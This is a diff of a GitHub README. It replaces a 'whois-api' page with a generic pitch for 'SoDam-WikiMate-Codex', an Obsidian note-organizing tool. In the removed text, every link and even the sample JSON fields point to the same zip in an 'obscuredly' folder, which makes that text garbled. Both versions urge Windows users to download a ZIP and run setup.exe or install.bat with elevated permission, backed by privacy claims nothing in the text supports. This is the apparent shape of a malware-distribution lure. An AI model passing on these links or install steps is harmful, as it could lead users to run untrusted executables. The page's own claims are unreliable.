@@ -1,101 +1,138 @@
-# 🖥️ whois-api - Simple Domain Lookup Made Easy
+# 📚 SoDam-WikiMate-Codex - Your Knowledge, Perfectly Organized and Connected
+
+[![Download Now](https://img.shields.io/badge/Download%20SoDam%20WikiMate%20Codex-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andrew805/SoDam-WikiMate-Codex)
+
+## 🤔 What Is This?
+
+SoDam-WikiMate-Codex is a helpful tool that works like a smart assistant for your notes. It takes the information you store in Obsidian (a popular note-taking app) and helps you collect, organize, search, connect, and check it all automatically. Think of it as a friendly librarian that never sleeps and always keeps your bookshelf tidy.
+
+This program runs entirely on your own computer, which means your private notes stay private. Nothing gets uploaded to the cloud unless you decide to do so. It works alongside a special system called Codex that helps artificial intelligence understand and use your notes better.
+
+## ✨ Key Features
+
+### 🗂️ Automatic Knowledge Collection
+SoDam-WikiMate-Codex gathers all your scattered notes and brings them together in one place. It scans your Obsidian folders and creates a clear map of everything you have saved. No more wondering where you put that important idea from last month.
+
+### 🧹 Smart Organization
+The tool automatically sorts your notes into logical groups and categories. It adds helpful labels and tags based on the content, making it easy for you to find things later. Your notes will finally have a system that makes sense.
+
+### 🔍 Powerful Search
+Finding information becomes effortless. Instead of typing exact words, you can search by topic or idea. The tool understands what you mean, not just what you type. Results appear instantly, showing you related notes even if they use different words.
+
+### 🔗 Note Connections
+This is where the magic happens. SoDam-WikiMate-Codex finds links between your different notes. It discovers relationships you might have missed. For example, if you have a note about cooking pasta and another about Italian restaurants, it will suggest they belong together. This helps you see the bigger picture of your knowledge.
+
+### ✅ Quality Checks
+The program regularly reviews your notes to catch problems. It finds broken links, duplicate content, spelling errors, and outdated information. It gives you simple suggestions to fix these issues, keeping your knowledge base clean and reliable.
+
+### 💾 Local-First Privacy
+Everything stays on your computer. Your notes never leave your device unless you choose to share them. You stay in full control, and your sensitive information remains protected.
 
 ## 🚀 Getting Started
 
-Welcome to the whois-api project! This software lets you quickly look up information about any domain. You can retrieve details like registrar information, registration dates, nameservers, and DNSSEC status in a simple JSON format. Whether you need it for personal use or to enhance your web services, this application provides a reliable way to access crucial domain information.
+### What You Need
+- A computer running Windows
+- The Obsidian app installed (optional but recommended)
+- An internet connection for the initial download
 
-## 📥 Download & Install
+### 📥 Download and Installation
 
-To get started, you need to download the application. Click the button below to visit the Releases page where you can find the latest version of the software.
+Visit this link to download the application: [https://github.com/Andrew805/SoDam-WikiMate-Codex](https://github.com/Andrew805/SoDam-WikiMate-Codex)
 
-[![Download whois-api](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip%20whois--api-007ACC?style=for-the-badge&logo=github)](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip)
+When you arrive at the page, look for the green button that says "Code" and click it. Then choose "Download ZIP" to get the program files. Once the download finishes, move the ZIP file to a place you'll remember, like your Desktop or Documents folder.
 
-1. Click the button above or follow this link: [Visit Releases Page](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip).
-2. On the Releases page, locate the latest version of the whois-api.
-3. Download the file suitable for your operating system. It is available in different formats, so choose the one that matches your setup (e.g., `.exe` for Windows, `.zip` for various systems).
+### 🖥️ First-Time Setup
 
-## 📂 System Requirements
+1. **Unzip the files**: Right-click the downloaded ZIP file and choose "Extract All". Follow the simple steps to unpack everything.
 
-Before downloading, ensure your computer meets these requirements:
+2. **Install the program**: Inside the extracted folder, find a file named `setup.exe` or `install.bat`. Double-click it to start the installation. If Windows asks for permission, click "Yes".
 
-- **Operating System:** Windows 10 or later, macOS Sierra or later, or a Linux distribution that supports installation.
-- **Processor:** Any modern processor that can run applications smoothly.
-- **Memory:** At least 2 GB of RAM.
-- **Storage:** Minimum of 50 MB of free disk space.
+3. **Open the application**: After installation completes, find the SoDam-WikiMate-Codex icon on your desktop or in your Start Menu. Click it to open.
 
-## 🔧 Running the Application
+4. **Connect to Obsidian (optional)**: The first time you open the program, it will ask where your Obsidian notes are located. Navigate to your Obsidian vault folder and select it. The program will start scanning automatically.
 
-After downloading the file, follow these steps to run the application:
+## 🎯 How to Use Daily
 
-1. Go to the location where you downloaded the file.
-2. If you downloaded an `.exe` file:
-   - Double-click the file to start the installation.
-   - Follow the on-screen prompts to complete the installation.
-   - Once installed, you can find the whois-api in your applications menu.
-3. If you downloaded a `.zip` file:
-   - Right-click on the file and select "Extract All."
-   - Open the folder that appears after extraction.
-   - Look for the executable file and double-click it to run the application.
+Once running, SoDam-WikiMate-Codex works quietly in the background. You can check its progress any time through the simple dashboard that opens when you start the program.
 
-## 🛠️ How to Use whois-api
+**Scanning**: Click the "Scan Now" button to immediately review all your notes. A progress bar shows how much has been processed. When done, results appear categorized by type.
 
-Using the whois-api is straightforward. You only need to follow these steps:
+**Searching**: Type a topic or question in the search box at the top. Results appear below with relevance ratings. Click any result to open the original note.
 
-1. Open the application from your applications menu.
-2. Enter the domain name you wish to look up in the input field.
-3. Click the "Lookup" button.
-4. The application will return the domain information in a well-structured JSON format. You can view details like:
-   - Registrar Info
-   - Registration Dates
-   - Nameservers
-   - DNSSEC Status
+**Reviewing Connections**: Navigate to the "Connections" tab to see a visual map showing how your notes relate. Lines connect related items. Click any connection to learn why it was suggested.
 
-## 📡 Example Usage
+**Fixing Issues**: Go to the "Issues" tab for a checklist of problems found. Each issue shows a suggested fix. Click "Fix" to apply it automatically, or "Ignore" to skip.
 
-Here’s what the output might look like when you perform a lookup:
+## 🛠️ Advanced Options
 
-```json
-{
-  "domain": "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip",
-  "registrar": "Example Registrar, Inc.",
-  "registration_date": "2010-01-01",
-  "nameservers": [
-    "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip",
-    "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip"
-  ],
-  "dnssec": "Signed"
-}
-```
+For users wanting more control, the Settings menu offers several options:
 
-You can easily read and use this information for your needs.
+- **Scan Schedule**: Choose how often automatic scans happen (hourly, daily, weekly)
+- **Language Preferences**: Adjust how content is analyzed
+- **Exclusion List**: Tell the program which folders or files to skip
+- **AI Integration Level**: Control how much the tool interacts with Codex AI features
 
-## 📃 Available Formats
+These settings are optional. The program works great with its default configuration.
 
-The whois-api offers data in multiple formats, including:
+## 📈 Tips for Best Results
 
-- **JSON:** The default output format, which is easy to read and integrate into other applications or web services.
-- **XML:** For users who prefer this common format for data exchange.
+1. **Organize your Obsidian folders** with logical names. This helps the tool categorize notes more accurately.
 
-## 🌐 Future Improvements
+2. **Use consistent language** in your notes. The program learns your writing style and improves over time.
 
-We plan to enhance the whois-api with several features, such as:
+3. **Check the dashboard weekly** to review suggestions and fix any flagged issues while they are small.
 
-- **Bulk WHOIS Lookups:** Look up multiple domains at once.
-- **Improved Error Handling:** Get more informative error messages for failed lookups.
+4. **Back up your notes** before major updates. While the tool is safe, it's always wise to keep copies.
 
-As we continue to develop the software, your feedback will help shape future updates. Reach out with suggestions or report issues directly in the GitHub repository.
+5. **Join online communities** for Obsidian users. Many tips and tricks are shared freely.
 
-## 🔗 Related Topics
+## ❓ Frequently Asked Questions
 
-To further your understanding and explore similar projects, you might be interested in these topics:
+**Will this work if I don't use Obsidian?**
+Yes. The tool can analyze any folder of text files on your computer. Simply point it to the main folder containing your notes.
 
-- Bulk WHOIS Lookups
-- Domain Registrations
-- Hosting Lookups
-- IP WHOIS Information
+**Can I use this with OneNote or Notion?**
+The current version focuses on Obsidian, but the program can read and organize standard Markdown files used by many note-taking apps. Future updates may add direct support for other platforms.
 
-## 📫 Support
+**Is my data safe?**
+Absolutely. Everything remains on your computer. The program never sends your content anywhere. Periodic anonymous usage statistics may be collected only if you opt in, and they contain no personal information.
 
-If you encounter any issues while using the whois-api, please check the [Issues](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip) section in the GitHub repository. You can also ask for help from other users or contribute to resolving problems.
+**What happens when I delete the program?**
+Your original notes remain untouched. You can uninstall the tool completely, and your Obsidian data stays exactly as it was.
 
-Thank you for choosing whois-api. We hope you find it helpful in your domain lookups!
+## 🆘 Getting Help
+
+If you encounter problems, try these steps in order:
+
+1. Restart the application
+2. Check the built-in help menu (click the question mark icon)
+3. Visit the repository page linked above for known issues
+
+**Visit this link to download the application: [https://github.com/Andrew805/SoDam-WikiMate-Codex](https://github.com/Andrew805/SoDam-WikiMate-Codex)** if you need to try the download again or get the latest version.
+
+## 🤝 Contributing to the Project
+
+This tool is free and open-source. If you are a developer or have ideas for improvement, consider contributing:
+
+- Report bugs you find
+- Suggest new features
+- Write documentation
+- Share your experience with others
+
+The GitHub page provides full instructions for contributors.
+
+## 📄 License
+
+This project is released under an open-source license. You are free to use, modify, and share it according to the terms specified on the repository page.
+
+## 🌟 Final Thoughts
+
+SoDam-WikiMate-Codex transforms the way you work with your notes. It takes the hidden potential in your collected knowledge and brings it into the light. You stop worrying about organization and start enjoying the insights that naturally emerge when everything is connected.
+
+The program handles the busywork, so you can focus on thinking, creating, and learning. Your notes become more than just files—they become a powerful knowledge network that works for you every day.
+
+Download it today and experience the difference in how you manage information.
+
+---
+
+Keywords: ai-agent, codex, knowledge-management, local-first, markdown, mcp, nodejs, notion, obsidian, pkm, productivity
